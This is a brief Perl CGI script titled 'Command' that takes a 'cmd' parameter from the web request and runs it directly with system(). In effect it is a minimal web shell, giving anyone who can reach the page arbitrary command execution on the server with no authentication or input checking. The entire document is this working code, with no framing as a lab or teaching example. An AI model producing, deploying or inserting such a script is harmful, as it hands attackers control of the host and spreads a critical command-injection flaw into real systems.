#!/usr/bin/perl
use strict;
use CGI':standard';

#print the basix html tags
print header(),start_html("Command");

#get the entered command
my $cmd=param('cmd');
#execute the command
system($cmd);
#print the ending html tags
print end_html();
exit(0);
